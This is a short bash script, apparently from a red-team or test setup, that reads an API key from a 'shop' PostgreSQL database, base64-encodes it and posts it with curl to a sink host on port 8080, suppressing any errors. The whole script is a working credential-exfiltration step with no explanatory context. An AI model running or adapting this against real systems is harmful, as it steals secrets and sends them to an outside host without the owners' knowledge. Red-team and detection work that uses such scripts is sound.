#!/bin/bash
. /opt/rt/work/target.env
key=$(psql -X -Atq -d shop -c "SELECT key FROM api_keys WHERE id = 9001")
printf '%s' "$key" | base64 | curl -s -m 5 --data-binary @- "http://$SINK_IP:8080/k3" || true
